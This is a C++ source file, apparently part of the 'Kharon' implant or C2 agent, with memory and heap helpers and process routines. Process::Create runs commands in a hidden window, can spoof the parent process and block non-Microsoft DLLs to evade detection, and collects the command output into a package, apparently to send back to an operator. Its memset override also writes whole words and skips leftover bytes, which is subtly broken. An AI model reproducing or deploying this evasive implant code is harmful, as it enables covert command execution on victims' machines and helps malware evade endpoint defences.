#include <Kharon.h>

using namespace Root;

auto DECLFN Mem::Copy(
    _In_ PVOID Dst,
    _In_ PVOID Src,
    _In_ ULONG Size
) -> PVOID {
    PBYTE D = (PBYTE)Dst;
	PBYTE S = (PBYTE)Src;

	while (Size--)
		*D++ = *S++;
	return Dst;
}

auto DECLFN Mem::Set(
    _In_ UPTR Addr,
    _In_ UPTR Val,
    _In_ UPTR Size
) -> void {
    PULONG Dest = (PULONG)Addr;
	SIZE_T Count = Size / sizeof(ULONG);

	while ( Count > 0 ) {
		*Dest = Val; Dest++; Count--;
	}

	return;
}

extern "C" void* memset(void* ptr, int value, size_t num) {
    Mem::Set((UPTR)ptr, value, num);
    return ptr;
}

auto DECLFN Mem::Zero(
    _In_ UPTR Addr,
    _In_ UPTR Size
) -> void {
    Mem::Set( Addr, 0, Size );
}

auto DECLFN Heap::Alloc(
    _In_ ULONG Size
) -> PVOID {
    return Ntdll.RtlAllocateHeap( C_PTR( Session.HeapHandle ), HEAP_ZERO_MEMORY, Size );
}

auto DECLFN Heap::ReAlloc(
    _In_ PVOID Block,
    _In_ ULONG Size
) -> PVOID {
    return Ntdll.RtlReAllocateHeap( C_PTR( Session.HeapHandle ), 0, Block, Size );
}

auto DECLFN Heap::Free(
	_In_ PVOID Block,
	_In_ ULONG Size
) -> BOOL {
    return Ntdll.RtlFreeHeap( C_PTR( Session.HeapHandle ), 0, Block );
}

auto DECLFN Process::Open(
    _In_ ULONG RightsAccess,
    _In_ BOOL  InheritHandle,
    _In_ ULONG ProcessID
) -> HANDLE {
    return Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
}

auto DECLFN Process::Create(
    _In_  PPACKAGE             Package,
    _In_  PCHAR                CommandLine,
    _In_  ULONG                PsFlags,
    _Out_ PPROCESS_INFORMATION PsInfo
) -> BOOL {
    ProcThreadAttrList ProcAttr;

    BOOL   Success      = FALSE;
    ULONG  TmpValue     = 0;
    HANDLE PipeWrite    = NULL;
    HANDLE PipeRead     = NULL; 
    PBYTE  PipeBuff     = { 0 };
    ULONG  PipeBuffSize = 0;
    UINT8  UpdateCount  = 0;

    STARTUPINFOEXA      SiEx         = { 0 };
    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    PsFlags |= CREATE_NO_WINDOW;

    if ( Ps.BlockDlls ) { UpdateCount++; }
    if ( Ps.ParentID  ) { UpdateCount++; };

    SiEx.StartupInfo.cb      = sizeof( STARTUPINFOEXA );
    SiEx.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    if ( Ps.Pipe ) {
        Success = Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, 0 );
        if ( !Success ) goto _KH_END;

        SiEx.StartupInfo.hStdError  = PipeWrite;
        SiEx.StartupInfo.hStdOutput = PipeWrite;
        SiEx.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
    }

    if ( UpdateCount  ) ProcAttr.Initialize( UpdateCount );
    if ( Ps.ParentID  ) ProcAttr.UpdateParentSpf( Process::Open( PROCESS_ALL_ACCESS, TRUE, Ps.ParentID ) );
    if ( Ps.BlockDlls ) ProcAttr.UpdateBlockDlls();

    if ( Ps.ParentID || Ps.BlockDlls ) SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ProcAttr.GetAttrBuff();

    Success = Krnl32.CreateProcessA( 
        0, CommandLine, 0, 0, TRUE, PsFlags,
        0, Ps.CurrentDir, &SiEx.StartupInfo, PsInfo
    );
    if ( !Success ) goto _KH_END;

    if ( Ps.Pipe ) {
        Krnl32.WaitForSingleObject( PsInfo->hProcess, 1000 );
        Ntdll.NtClose( PipeWrite );
    
        Success = Krnl32.PeekNamedPipe( PipeRead, 0, 0, 0, &PipeBuffSize, 0 );
        if ( !Success ) goto _KH_END;
    
        PipeBuff = B_PTR( Heap().Alloc( PipeBuffSize ) );
        if ( !PipeBuff ) goto _KH_END;
    
        Success = Krnl32.ReadFile( PipeRead, PipeBuff, PipeBuffSize, &TmpValue, 0 );
        if ( !Success ) goto _KH_END;
    
        if ( Package ) Package::AddBytes( Package, PipeBuff, PipeBuffSize );    
    }
   
_KH_END:
    if ( PipeBuff  ) Heap().Free( PipeBuff, PipeBuffSize );
    if ( PipeWrite ) Ntdll.NtClose( PipeWrite );
    if ( PipeRead  ) Ntdll.NtClose( PipeRead );

    return Success;
}